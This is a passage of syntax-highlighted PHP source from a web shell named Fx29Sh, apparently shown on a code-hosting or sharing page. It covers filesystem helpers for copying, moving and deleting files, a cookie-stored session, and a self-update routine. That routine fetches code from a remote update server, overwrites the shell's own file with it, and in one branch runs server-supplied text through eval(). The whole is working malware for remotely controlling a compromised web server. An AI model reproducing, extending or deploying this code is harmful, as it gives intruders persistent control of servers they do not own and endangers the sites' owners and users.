  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$letters</span><span class="p">))</span> <span class="p">{</span> <span class="k">Return</span> <span class="nv">$letters</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">else</span>  <span class="p">{</span> <span class="k">Return</span> <span class="s2">&quot;None&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">view_size</span><span class="p">(</span><span class="nv">$size</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$size</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1073741824</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; GB&quot;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1048576</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1048576</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; MB&quot;</span><span class="p">;}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1024</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; KB&quot;</span><span class="p">;}</span>
    <span class="k">else</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">;}</span>
    <span class="k">return</span> <span class="nv">$size</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">disp_freespace</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$free</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_free_space</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">);</span>
  <span class="nv">$total</span> <span class="o">=</span> <span class="o">@</span><span class="nb">disk_total_space</span><span class="p">(</span><span class="nv">$curdrv</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$free</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span> <span class="o">===</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$free</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$free</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$total</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
  <span class="nv">$used</span> <span class="o">=</span> <span class="nv">$total</span><span class="o">-</span><span class="nv">$free</span><span class="p">;</span>
  <span class="nv">$free_percent</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="mi">100</span><span class="o">/</span><span class="p">(</span><span class="nv">$total</span><span class="o">/</span><span class="nv">$free</span><span class="p">),</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;%&quot;</span><span class="p">;</span>
  <span class="nv">$free</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$free</span><span class="p">);</span>
  <span class="nv">$total</span> <span class="o">=</span> <span class="nx">view_size</span><span class="p">(</span><span class="nv">$total</span><span class="p">);</span>
  <span class="k">return</span> <span class="s2">&quot;</span><span class="si">$free</span><span class="s2"> of </span><span class="si">$total</span><span class="s2"> (</span><span class="si">$free_percent</span><span class="s2">)&quot;</span><span class="p">;</span>
<span class="p">}</span>
<span class="c1">###[ Fx29Sh UPDATE FUNCTIONS ]###</span>
<span class="k">function</span> <span class="nf">fx29sh_getupdate</span><span class="p">(</span><span class="nv">$update</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">global</span> <span class="nv">$fx29sh_updateurl</span><span class="p">;</span>
  <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$fx29sh_updateurl</span><span class="o">.</span><span class="s2">&quot;?version=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nx">sh_ver</span><span class="p">));</span>
  <span class="nv">$data</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;lt;div class=errmsg&amp;gt;Can&#39;t connect to update-server! (</span><span class="si">$fx29sh_updateurl</span><span class="s2">)&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">ltrim</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;You already using latest version!&quot;</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x02</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span>
     <span class="nv">$string</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="nb">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">2</span><span class="p">}));</span>
      <span class="nv">$string</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">,</span><span class="nv">$string</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$update</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$confvars</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$sourceurl</span> <span class="o">=</span> <span class="nv">$string</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
        <span class="nv">$source</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$sourceurl</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$source</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;Can&#39;t fetch update!&quot;</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
          <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fopen</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;Local error: can&#39;t write update to &quot;</span><span class="o">.</span><span class="k">__FILE__</span><span class="o">.</span><span class="s2">&quot;! You may download fx29shell.php manually &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sourceurl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;u&amp;gt;here&amp;lt;/u&amp;gt;&amp;lt;/a&amp;gt;.&quot;</span><span class="p">;</span> <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span>
            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="nv">$source</span><span class="p">);</span>
            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
            <span class="k">return</span> <span class="s2">&quot;Update completed!&quot;</span><span class="p">;</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;New version is available: &quot;</span><span class="o">.</span><span class="nv">$string</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span> <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">elseif</span> <span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x99</span><span class="s2">&quot;</span> <span class="k">and</span> <span class="nv">$data</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span> <span class="o">==</span> <span class="s2">&quot;</span><span class="se">\x03</span><span class="s2">&quot;</span><span class="p">)</span> <span class="p">{</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$string</span><span class="p">);</span> <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="s2">&quot;&amp;lt;div class=errmsg&amp;gt;Error in protocol: segmentation failed! (&quot;</span><span class="o">.</span><span class="nv">$data</span><span class="o">.</span><span class="s2">&quot;)&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="c1">###[ END Fx29Sh UPDATE FUNCTIONS ]###</span>
<span class="k">function</span> <span class="nf">fx29_buff_prepare</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">,</span> <span class="nv">$act</span><span class="p">;</span>
  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$v</span><span class="p">));</span>
  <span class="p">}</span>
  <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
  <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span>  <span class="o">=</span> <span class="nb">array_unique</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
  <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]);</span>
  <span class="nb">sort</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">!=</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">fx29_sess_put</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">global</span> <span class="nv">$sess_cookie</span><span class="p">;</span>
  <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
  <span class="nx">fx29_buff_prepare</span><span class="p">();</span>
  <span class="nv">$sess_data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
  <span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
  <span class="nb">setcookie</span><span class="p">(</span><span class="nv">$sess_cookie</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
<span class="p">}</span>
<span class="c1">###[ FILESYSTEM FUNCTIONS ]###</span>
<span class="k">function</span> <span class="nf">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
  <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
      <span class="k">else</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
  <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">fs_copy_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
  <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">)))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">));}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
    <span class="k">return</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span> <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;</span> <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="p">);}</span>
  <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
      <span class="nv">$ret</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
      <span class="k">else</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">)</span> <span class="k">and</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
     <span class="p">}</span>
   <span class="p">}</span>
  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
  <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">fs_move_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
  <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
    <span class="k">return</span> <span class="nx">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="p">);}</span>
    <span class="k">else</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span> <span class="p">{</span>
  <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
